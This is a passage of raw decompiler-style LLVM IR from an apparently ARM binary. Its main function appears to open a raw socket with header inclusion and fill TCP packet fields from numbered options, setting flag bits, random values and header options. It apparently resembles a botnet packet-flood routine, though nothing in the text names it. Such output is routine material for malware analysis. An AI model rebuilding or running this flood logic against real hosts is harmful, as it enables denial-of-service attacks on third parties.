  %v9_c1e4 = icmp eq i32 %v3_be04, %v1_c1e4
  store i1 %v9_c1e4, i1* %cpsr_z.global-to-local, align 1
  %v3_c1e8 = load i32, i32* @r5, align 4
  %v4_c1e8 = add i32 %v3_c1e8, 4
  %v5_c1e8 = inttoptr i32 %v4_c1e8 to i16*
  store i16 %v1_c1dc, i16* %v5_c1e8, align 2
  br i1 %v9_c1e4, label %dec_label_pc_c1f0, label %dec_label_pc_c1dc.dec_label_pc_c0b4_crit_edge

dec_label_pc_c1dc.dec_label_pc_c0b4_crit_edge:    ; preds = %dec_label_pc_c1dc
  %v1_c0b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0b4

dec_label_pc_c1f0:                                ; preds = %dec_label_pc_c1dc, %dec_label_pc_c0a8
  %v0_c1f0 = call i32 @function_f570()
  %v1_c1f0 = trunc i32 %v0_c1f0 to i16
  store i32 %v3_be08, i32* %r2.global-to-local, align 4
  %v1_c1f8 = load i32, i32* @r4, align 4
  %v9_c1f8 = icmp eq i32 %v3_be08, %v1_c1f8
  store i1 %v9_c1f8, i1* %cpsr_z.global-to-local, align 1
  %v3_c1fc = load i32, i32* @r5, align 4
  %v4_c1fc = add i32 %v3_c1fc, 20
  %v5_c1fc = inttoptr i32 %v4_c1fc to i16*
  store i16 %v1_c1f0, i16* %v5_c1fc, align 2
  br i1 %v9_c1f8, label %dec_label_pc_c204, label %dec_label_pc_c1f0.dec_label_pc_c0c0_crit_edge

dec_label_pc_c1f0.dec_label_pc_c0c0_crit_edge:    ; preds = %dec_label_pc_c1f0
  %v1_c0c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0c0

dec_label_pc_c204:                                ; preds = %dec_label_pc_c1f0, %dec_label_pc_c0b4
  %v0_c204 = call i32 @function_f570()
  %v1_c204 = trunc i32 %v0_c204 to i16
  store i32 %v5_bca0, i32* %r3.global-to-local, align 4
  %v1_c20c = load i32, i32* @r4, align 4
  %v9_c20c = icmp eq i32 %v5_bca0, %v1_c20c
  store i1 %v9_c20c, i1* %cpsr_z.global-to-local, align 1
  %v3_c210 = load i32, i32* @r6, align 4
  %v4_c210 = add i32 %v3_c210, 2
  %v5_c210 = inttoptr i32 %v4_c210 to i16*
  store i16 %v1_c204, i16* %v5_c210, align 2
  br i1 %v9_c20c, label %dec_label_pc_c218, label %dec_label_pc_c204.dec_label_pc_c0cc_crit_edge

dec_label_pc_c204.dec_label_pc_c0cc_crit_edge:    ; preds = %dec_label_pc_c204
  %v1_c0d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c0cc

dec_label_pc_c218:                                ; preds = %dec_label_pc_c204, %dec_label_pc_c0c0
  %v0_c218 = call i32 @function_f570()
  store i32 %v6_bcbc, i32* %r1.global-to-local, align 4
  %v1_c220 = load i32, i32* @r4, align 4
  %v9_c220 = icmp eq i32 %v6_bcbc, %v1_c220
  store i1 %v9_c220, i1* %cpsr_z.global-to-local, align 1
  %v1_c224 = load i32, i32* @r6, align 4
  %v2_c224 = add i32 %v1_c224, 4
  %v3_c224 = inttoptr i32 %v2_c224 to i32*
  store i32 %v0_c218, i32* %v3_c224, align 4
  br i1 %v9_c220, label %dec_label_pc_c22c, label %dec_label_pc_c0d8

dec_label_pc_c22c:                                ; preds = %dec_label_pc_c218, %dec_label_pc_c0cc
  %v0_c22c = call i32 @function_f570()
  store i32 %v1_bd8c, i32* %r2.global-to-local, align 4
  store i1 %v2_c234, i1* %cpsr_z.global-to-local, align 1
  %v1_c238 = load i32, i32* @r6, align 4
  %v2_c238 = add i32 %v1_c238, 8
  %v3_c238 = inttoptr i32 %v2_c238 to i32*
  store i32 %v0_c22c, i32* %v3_c238, align 4
  br i1 %v2_c234, label %dec_label_pc_c0e4, label %dec_label_pc_c240

dec_label_pc_c240:                                ; preds = %dec_label_pc_c0d8, %dec_label_pc_c22c
  %v0_c240 = load i32, i32* @r5, align 4
  %v1_c240 = add i32 %v0_c240, 40
  store i32 %v5_bd64, i32* %r1.global-to-local, align 4
  %v2_c248 = inttoptr i32 %v1_c240 to i16*
  %v3_c248 = call i32 @function_f770(i16* %v2_c248, i32 %v5_bd64)
  br label %dec_label_pc_c0e4

dec_label_pc_c250:                                ; preds = %dec_label_pc_bdec
  store i32 %v5_bd64, i32* %r1.global-to-local, align 4
  %v1_c258 = add i32 %v5_bd64, 20
  store i32 %v1_c258, i32* %sb.global-to-local, align 4
  %v3_c25c = mul i32 %v5_bd64, 65536
  store i32 %v3_c25c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c044

; uselistorder directives
  uselistorder i32 %v1_c160, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c12c, { 1, 0 }
  uselistorder i1 %v2_c234, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c1d0, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-148.0, { 1, 0 }
  uselistorder i32 %v0_c00c, { 1, 0 }
  uselistorder i32 %v1_bf90, { 1, 0, 2, 3 }
  uselistorder i32 %v1_be78, { 2, 0, 1 }
  uselistorder i32 %v1_be74, { 2, 0, 1 }
  uselistorder i32 %v1_be70, { 1, 0 }
  uselistorder i32 %v1_be58, { 1, 0 }
  uselistorder i32 %v1_be54, { 1, 0 }
  uselistorder i32 %v1_be50, { 1, 0 }
  uselistorder i32 %v3_be2c, { 1, 0 }
  uselistorder i32 %v3_be00, { 0, 1, 4, 2, 3 }
  uselistorder i1 %v7_bde4, { 1, 0 }
  uselistorder i1 %v7_bdb8, { 1, 0 }
  uselistorder i32 %v3_bdb4, { 5, 1, 3, 4, 2, 0, 6 }
  uselistorder i32 %v6_bda0, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_bd8c, { 1, 0, 2, 3 }
  uselistorder i32 %v5_bd64, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bd04, { 0, 2, 1 }
  uselistorder i32 %v6_bcbc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bca0, { 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_bc0c, { 1, 0 }
  uselistorder i32 %v2_bbd4, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 27, 28, 29, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 20, 21, 22, 13, 14, 15, 16, 17, 18, 19, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 16, 17, 18, 11, 12, 13, 14, 15, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 38, 37, 40, 39, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 21, 18, 19, 22, 23, 24 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c240, { 1, 0 }
  uselistorder label %dec_label_pc_c0e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c060, { 1, 0 }
  uselistorder label %dec_label_pc_c050, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c02c, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_be94, { 1, 0 }
}

define i32 @function_c270(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c270:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c270 = load i32, i32* @r4, align 4
  %v27_c270 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c28c = call i32 @function_1320c(i32 %arg1, i32 4)
  %v0_c290 = load i32, i32* @r5, align 4
  store i32 %v0_c290, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c2a0 = load i32, i32* @r4, align 4
  %v5_c2a4 = inttoptr i32 %v0_c290 to i32*
  %v6_c2a4 = call i32 @function_a430(i32 %v0_c2a0, i32* %v5_c2a4, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c2bc = load i32, i32* @r5, align 4
  store i32 %v0_c2bc, i32* %r1.global-to-local, align 4
  %v0_c2c0 = load i32, i32* @r4, align 4
  %v5_c2c4 = trunc i32 %v6_c2a4 to i8
  %v6_c2c8 = inttoptr i32 %v0_c2bc to i32*
  %v7_c2c8 = call i32 @function_a430(i32 %v0_c2c0, i32* %v6_c2c8, i32 3, i32 65535)
  %v0_c2cc = load i32, i32* @r5, align 4
  store i32 %v0_c2cc, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c2dc = load i32, i32* @r4, align 4
  %v5_c2e0 = inttoptr i32 %v0_c2cc to i32*
  %v6_c2e0 = call i32 @function_a430(i32 %v0_c2dc, i32* %v5_c2e0, i32 4, i32 64)
  %v0_c2ec = load i32, i32* @r5, align 4
  store i32 %v0_c2ec, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c2f8 = load i32, i32* @r4, align 4
  %v6_c300 = inttoptr i32 %v0_c2ec to i32*
  %v7_c300 = call i32 @function_a430(i32 %v0_c2f8, i32* %v6_c300, i32 5, i32 1)
  %v1_c30c = urem i32 %v7_c300, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c318 = load i32, i32* @r5, align 4
  store i32 %v0_c318, i32* %r1.global-to-local, align 4
  %v0_c31c = load i32, i32* @r4, align 4
  %v5_c324 = inttoptr i32 %v0_c318 to i32*
  %v6_c324 = call i32 @function_a430(i32 %v0_c31c, i32* %v5_c324, i32 6, i32 65535)
  %v0_c330 = load i32, i32* @r5, align 4
  store i32 %v0_c330, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c33c = load i32, i32* @r4, align 4
  %v5_c340 = inttoptr i32 %v0_c330 to i32*
  %v6_c340 = call i32 @function_a430(i32 %v0_c33c, i32* %v5_c340, i32 7, i32 65535)
  %v0_c34c = load i32, i32* @r5, align 4
  store i32 %v0_c34c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v0_c358 = load i32, i32* @r4, align 4
  %v5_c35c = inttoptr i32 %v0_c34c to i32*
  %v6_c35c = call i32 @function_a430(i32 %v0_c358, i32* %v5_c35c, i32 17, i32 65535)
  %v0_c360 = load i32, i32* @r5, align 4
  store i32 %v0_c360, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c370 = load i32, i32* @r4, align 4
  %v5_c374 = inttoptr i32 %v0_c360 to i32*
  %v6_c374 = call i32 @function_a430(i32 %v0_c370, i32* %v5_c374, i32 18, i32 0)
  %v0_c378 = load i32, i32* @r5, align 4
  store i32 %v0_c378, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c388 = load i32, i32* @r4, align 4
  %v5_c38c = inttoptr i32 %v0_c378 to i32*
  %v6_c38c = call i32 @function_a430(i32 %v0_c388, i32* %v5_c38c, i32 11, i32 0)
  %v0_c390 = load i32, i32* @r5, align 4
  store i32 %v0_c390, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3a0 = load i32, i32* @r4, align 4
  %v5_c3a4 = inttoptr i32 %v0_c390 to i32*
  %v6_c3a4 = call i32 @function_a430(i32 %v0_c3a0, i32* %v5_c3a4, i32 12, i32 0)
  %v0_c3a8 = load i32, i32* @r5, align 4
  store i32 %v0_c3a8, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3b8 = load i32, i32* @r4, align 4
  %v5_c3bc = inttoptr i32 %v0_c3a8 to i32*
  %v6_c3bc = call i32 @function_a430(i32 %v0_c3b8, i32* %v5_c3bc, i32 13, i32 0)
  %v0_c3c0 = load i32, i32* @r5, align 4
  store i32 %v0_c3c0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c3d0 = load i32, i32* @r4, align 4
  %v5_c3d4 = inttoptr i32 %v0_c3c0 to i32*
  %v6_c3d4 = call i32 @function_a430(i32 %v0_c3d0, i32* %v5_c3d4, i32 14, i32 0)
  %v0_c3d8 = load i32, i32* @r5, align 4
  store i32 %v0_c3d8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v6_c3d4, i32* @sb, align 4
  %v0_c3e8 = load i32, i32* @r4, align 4
  %v4_c3ec = inttoptr i32 %v0_c3d8 to i32*
  %v5_c3ec = call i32 @function_a430(i32 %v0_c3e8, i32* %v4_c3ec, i32 15, i32 1)
  %v0_c3f0 = load i32, i32* @r5, align 4
  store i32 %v0_c3f0, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v5_c3ec, i32* @sl, align 4
  %v0_c400 = load i32, i32* @r4, align 4
  %v4_c404 = inttoptr i32 %v0_c3f0 to i32*
  %v5_c404 = call i32 @function_a430(i32 %v0_c400, i32* %v4_c404, i32 16, i32 0)
  %v0_c40c = load i32, i32* @r5, align 4
  store i32 %v0_c40c, i32* %r1.global-to-local, align 4
  %v2_c410 = load i32, i32* @global_var_2290c.90, align 4
  store i32 %v2_c410, i32* %r3.global-to-local, align 4
  store i32 %v5_c404, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c41c = load i32, i32* @r4, align 4
  %v5_c420 = inttoptr i32 %v0_c40c to i32*
  %v6_c420 = call i32 @function_a3c4(i32 %v0_c41c, i32* %v5_c420, i32 25, i32 %v2_c410, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c434 = call i32 @function_14b54(i32 2, i32 3, i32 6)
  store i32 %v3_c434, i32* @r0, align 4
  %v7_c438 = icmp eq i32 %v3_c434, -1
  store i1 %v7_c438, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c434, i32* @fp, align 4
  br i1 %v7_c438, label %dec_label_pc_c8dc, label %dec_label_pc_c444

dec_label_pc_c444:                                ; preds = %dec_label_pc_c270
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c44c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c44c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_c460 = call i32 @function_14ae4(i32 %v3_c434, i32 0, i32 3, i32 %v6_c44c, i32 ptrtoint (i32* @0 to i32))
  %v7_c464 = icmp eq i32 %v5_c460, -1
  store i1 %v7_c464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c464, label %dec_label_pc_c8d4, label %dec_label_pc_c46c

dec_label_pc_c46c:                                ; preds = %dec_label_pc_c444
  %v3_c484 = urem i32 %v6_c340, 65536
  %v3_c494 = urem i32 %v7_c2c8, 65536
  store i32 %v3_c494, i32* %r3.global-to-local, align 4
  %v3_c498 = urem i32 %v6_c324, 65536
  store i32 %v3_c498, i32* %r2.global-to-local, align 4
  %v1_c49c = urem i32 %v6_c38c, 256
  store i32 %v1_c49c, i32* %r1.global-to-local, align 4
  %v0_c4a0 = load i32, i32* @r7, align 4
  %v2_c4a0 = icmp eq i32 %v0_c4a0, 0
  store i1 %v2_c4a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c4a0, label %dec_label_pc_c7f0.preheader, label %dec_label_pc_c4b8

dec_label_pc_c4b8:                                ; preds = %dec_label_pc_c46c
  store i32 %v6_c35c, i32* %r2.global-to-local, align 4
  %v3_c4c0 = urem i32 %v6_c35c, 65536
  store i32 0, i32* @r4, align 4
  %v1_c4d8 = urem i32 %v6_c38c, 2
  store i32 %v1_c4d8, i32* %r3.global-to-local, align 4
  %v1_c4dc = urem i32 %v6_c3a4, 2
  %v1_c4e0 = urem i32 %v6_c3bc, 2
  store i32 %v1_c4e0, i32* %r1.global-to-local, align 4
  %v0_c4e4 = load i32, i32* @sb, align 4
  %v1_c4e4 = urem i32 %v0_c4e4, 2
  store i32 %v1_c4e4, i32* @sb, align 4
  %v0_c4e8 = load i32, i32* @sl, align 4
  %v1_c4e8 = urem i32 %v0_c4e8, 2
  store i32 %v1_c4e8, i32* @sl, align 4
  %v0_c4ec = load i32, i32* @r6, align 4
  %v1_c4ec = urem i32 %v0_c4ec, 2
  store i32 %v1_c4ec, i32* @r6, align 4
  %v4_c698 = sext i8 %v5_c2c4 to i32
  %sext = mul i32 %v6_c2e0, 16777216
  %v4_c6b8 = sdiv i32 %sext, 16777216
  %v2_c6bc = icmp eq i32 %v1_c30c, 0
  %tmp = sub nsw i32 0, %v1_c4d8
  %v4_c560 = and i32 %tmp, 32
  %tmp51 = sub nsw i32 0, %v1_c4dc
  %v4_c574 = and i32 %tmp51, 16
  %tmp52 = sub nsw i32 0, %v1_c4e0
  %v4_c588 = and i32 %tmp52, 8
  %tmp53 = sub nsw i32 0, %v1_c4e4
  %v4_c59c = and i32 %tmp53, 4
  %tmp54 = sub nsw i32 0, %v1_c4e8
  %v3_c5b0 = and i32 %tmp54, 2
  br label %dec_label_pc_c65c

dec_label_pc_c50c:                                ; preds = %dec_label_pc_c65c, %dec_label_pc_c6d0
  %v2_c510 = phi i32 [ %v0_c6c8, %dec_label_pc_c65c ], [ %v2_c510.pre, %dec_label_pc_c6d0 ]
  store i32 6, i32* @r6, align 4
  %v3_c510 = add i32 %v2_c510, 9
  %v4_c510 = inttoptr i32 %v3_c510 to i8*
  store i8 6, i8* %v4_c510, align 1
  %v3_c514 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c514, i32* %r2.global-to-local, align 4
  %v3_c51c = mul i32 %v3_c514, 32
  store i32 %v3_c51c, i32* %r3.global-to-local, align 4
  %v1_c520 = load i32, i32* @sb, align 4
  %v2_c520 = add i32 %v1_c520, 12
  %v3_c520 = inttoptr i32 %v2_c520 to i32*
  store i32 %v6_c420, i32* %v3_c520, align 4
  %v0_c524 = load i32, i32* %r3.global-to-local, align 4
  %v1_c524 = load i32, i32* %r2.global-to-local, align 4
  %tmp55 = mul i32 %v1_c524, -8
  %v5_c524 = add i32 %v0_c524, %tmp55
  %v1_c528 = load i32, i32* @r8, align 4
  %v2_c528 = add i32 %v1_c528, %v5_c524
  store i32 %v2_c528, i32* %r3.global-to-local, align 4
  %v1_c52c = add i32 %v2_c528, 16
  %v2_c52c = inttoptr i32 %v1_c52c to i32*
  %v3_c52c = load i32, i32* %v2_c52c, align 4
  store i32 %v3_c52c, i32* %r2.global-to-local, align 4
  %v1_c534 = load i32, i32* @sb, align 4
  %v2_c534 = add i32 %v1_c534, 16
  %v3_c534 = inttoptr i32 %v2_c534 to i32*
  store i32 %v3_c52c, i32* %v3_c534, align 4
  %v1_c538 = call i32 @function_1484c(i32 %v3_c498)
  %v2_c538 = trunc i32 %v1_c538 to i16
  %v3_c53c = load i32, i32* @sb, align 4
  %v4_c53c = add i32 %v3_c53c, 20
  %v5_c53c = inttoptr i32 %v4_c53c to i16*
  store i16 %v2_c538, i16* %v5_c53c, align 2
  %v1_c544 = call i32 @function_1484c(i32 %v3_c484)
  %v2_c544 = trunc i32 %v1_c544 to i16
  %v3_c548 = load i32, i32* @sl, align 4
  %v4_c548 = add i32 %v3_c548, 2
  %v5_c548 = inttoptr i32 %v4_c548 to i16*
  store i16 %v2_c544, i16* %v5_c548, align 2
  %v1_c550 = call i32 @function_1484c(i32 %v3_c4c0)
  %v0_c554 = load i32, i32* @sl, align 4
  %v1_c554 = add i32 %v0_c554, 13
  %v2_c554 = inttoptr i32 %v1_c554 to i8*
  %v3_c554 = load i8, i8* %v2_c554, align 1
  %v4_c554 = zext i8 %v3_c554 to i32
  store i32 %v1_c4d8, i32* %r1.global-to-local, align 4
  %v1_c55c = and i32 %v4_c554, 223
  %v5_c560 = or i32 %v1_c55c, %v4_c560
  store i32 %v5_c560, i32* %r3.global-to-local, align 4
  %v1_c564 = trunc i32 %v5_c560 to i8
  store i8 %v1_c564, i8* %v2_c554, align 1
  %v0_c568 = load i32, i32* @sl, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c4dc, i32* %r3.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 239
  %v5_c574 = or i32 %v1_c570, %v4_c574
  store i32 %v5_c574, i32* %r2.global-to-local, align 4
  %v1_c578 = trunc i32 %v5_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* @sl, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c4e0, i32* %r1.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 247
  %v5_c588 = or i32 %v1_c584, %v4_c588
  store i32 %v5_c588, i32* %r3.global-to-local, align 4
  %v1_c58c = trunc i32 %v5_c588 to i8
  store i8 %v1_c58c, i8* %v2_c57c, align 1
  %v0_c590 = load i32, i32* @sl, align 4
  %v1_c590 = add i32 %v0_c590, 13
  %v2_c590 = inttoptr i32 %v1_c590 to i8*
  %v3_c590 = load i8, i8* %v2_c590, align 1
  %v4_c590 = zext i8 %v3_c590 to i32
  store i32 %v1_c4e4, i32* %r3.global-to-local, align 4
  %v1_c598 = and i32 %v4_c590, 251
  %v5_c59c = or i32 %v1_c598, %v4_c59c
  store i32 %v5_c59c, i32* %r2.global-to-local, align 4
  %v1_c5a0 = trunc i32 %v5_c59c to i8
  store i8 %v1_c5a0, i8* %v2_c590, align 1
  %v0_c5a4 = load i32, i32* @sl, align 4
  %v1_c5a4 = add i32 %v0_c5a4, 13
  %v2_c5a4 = inttoptr i32 %v1_c5a4 to i8*
  %v3_c5a4 = load i8, i8* %v2_c5a4, align 1
  %v4_c5a4 = zext i8 %v3_c5a4 to i32
  store i32 %v1_c4e8, i32* %r1.global-to-local, align 4
  %v1_c5ac = and i32 %v4_c5a4, 253
  %v4_c5b0 = or i32 %v1_c5ac, %v3_c5b0
  store i32 %v4_c5b0, i32* %r3.global-to-local, align 4
  %v1_c5b4 = trunc i32 %v4_c5b0 to i8
  store i8 %v1_c5b4, i8* %v2_c5a4, align 1
  %v0_c5b8 = load i32, i32* @sl, align 4
  %v1_c5b8 = add i32 %v0_c5b8, 12
  %v2_c5b8 = inttoptr i32 %v1_c5b8 to i8*
  %v3_c5b8 = load i8, i8* %v2_c5b8, align 1
  %v4_c5b8 = zext i8 %v3_c5b8 to i32
  store i32 %v4_c5b8, i32* %r2.global-to-local, align 4
  %v1_c5bc = add i32 %v0_c5b8, 13
  %v2_c5bc = inttoptr i32 %v1_c5bc to i8*
  %v3_c5bc = load i8, i8* %v2_c5bc, align 1
  %v4_c5bc = zext i8 %v3_c5bc to i32
  store i32 %v1_c4ec, i32* %r1.global-to-local, align 4
  %tmp56 = urem i8 %v3_c5b8, 16
  %v1_c5c4 = zext i8 %tmp56 to i32
  %v1_c5c8 = and i32 %v4_c5bc, 254
  %v2_c5cc = or i32 %v1_c5c8, %v1_c4ec
  store i32 %v2_c5cc, i32* %r3.global-to-local, align 4
  %v1_c5d0 = or i32 %v1_c5c4, 160
  store i32 %v1_c5d0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r4.global-to-local, align 4
  store i32 4, i32* @r5, align 4
  %v1_c5dc = trunc i32 %v2_c5cc to i8
  store i8 %v1_c5dc, i8* %v2_c5bc, align 1
  %v0_c5e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c5e0 = trunc i32 %v0_c5e0 to i8
  %v2_c5e0 = load i32, i32* @sl, align 4
  %v3_c5e0 = add i32 %v2_c5e0, 12
  %v4_c5e0 = inttoptr i32 %v3_c5e0 to i8*
  store i8 %v1_c5e0, i8* %v4_c5e0, align 1
  %v1_c5e4 = load i32, i32* @sl, align 4
  %v2_c5e4 = add i32 %v1_c5e4, 4
  %v3_c5e4 = inttoptr i32 %v2_c5e4 to i32*
  store i32 %v1_c550, i32* %v3_c5e4, align 4
  %v0_c5e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c5e8 = trunc i32 %v0_c5e8 to i8
  %v2_c5e8 = load i32, i32* @sb, align 4
  %v3_c5e8 = add i32 %v2_c5e8, 40
  %v4_c5e8 = inttoptr i32 %v3_c5e8 to i8*
  store i8 %v1_c5e8, i8* %v4_c5e8, align 1
  %v0_c5ec = load i32, i32* @r5, align 4
  %v1_c5ec = trunc i32 %v0_c5ec to i8
  %v2_c5ec = load i32, i32* @sb, align 4
  %v3_c5ec = add i32 %v2_c5ec, 41
  %v4_c5ec = inttoptr i32 %v3_c5ec to i8*
  store i8 %v1_c5ec, i8* %v4_c5ec, align 1
  %v0_c5f0 = call i32 @function_f570()
  %v1_c5f4 = urem i32 %v0_c5f0, 16
  %v1_c5f8 = or i32 %v1_c5f4, 1392
  %v1_c5fc = add nuw nsw i32 %v1_c5f8, 8
  %v1_c600 = call i32 @function_1484c(i32 %v1_c5fc)
  %v2_c600 = trunc i32 %v1_c600 to i16
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v0_c60c = load i32, i32* %r4.global-to-local, align 4
  %v1_c60c = trunc i32 %v0_c60c to i8
  %v2_c60c = load i32, i32* @sb, align 4
  %v3_c60c = add i32 %v2_c60c, 45
  %v4_c60c = inttoptr i32 %v3_c60c to i8*
  store i8 %v1_c60c, i8* %v4_c60c, align 1
  %v0_c610 = load i32, i32* %r3.global-to-local, align 4
  %v1_c610 = trunc i32 %v0_c610 to i8
  %v2_c610 = load i32, i32* @sb, align 4
  %v3_c610 = add i32 %v2_c610, 46
  %v4_c610 = inttoptr i32 %v3_c610 to i8*
  store i8 %v1_c610, i8* %v4_c610, align 1
  %v0_c614 = load i32, i32* %r2.global-to-local, align 4
  %v1_c614 = trunc i32 %v0_c614 to i8
  %v2_c614 = load i32, i32* @sb, align 4
  %v3_c614 = add i32 %v2_c614, 47
  %v4_c614 = inttoptr i32 %v3_c614 to i8*
  store i8 %v1_c614, i8* %v4_c614, align 1
  %v3_c618 = load i32, i32* @sb, align 4
  %v4_c618 = add i32 %v3_c618, 42
  %v5_c618 = inttoptr i32 %v4_c618 to i16*
  store i16 %v2_c600, i16* %v5_c618, align 2
  %v0_c61c = load i32, i32* @r5, align 4
  %v1_c61c = trunc i32 %v0_c61c to i8
  %v2_c61c = load i32, i32* @sb, align 4
  %v3_c61c = add i32 %v2_c61c, 44
  %v4_c61c = inttoptr i32 %v3_c61c to i8*
  store i8 %v1_c61c, i8* %v4_c61c, align 1
  %v0_c620 = call i32 @function_f570()
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_c630 = load i32, i32* @r6, align 4
  %v1_c630 = trunc i32 %v0_c630 to i8
  %v2_c630 = load i32, i32* @sb, align 4
  %v3_c630 = add i32 %v2_c630, 59
  %v4_c630 = inttoptr i32 %v3_c630 to i8*
  store i8 %v1_c630, i8* %v4_c630, align 1
  %v1_c634 = load i32, i32* @sb, align 4
  %v2_c634 = add i32 %v1_c634, 48
  %v3_c634 = inttoptr i32 %v2_c634 to i32*
  store i32 %v0_c620, i32* %v3_c634, align 4
  %v0_c638 = load i32, i32* %r3.global-to-local, align 4
  %v1_c638 = load i32, i32* @sb, align 4
  %v2_c638 = add i32 %v1_c638, 52
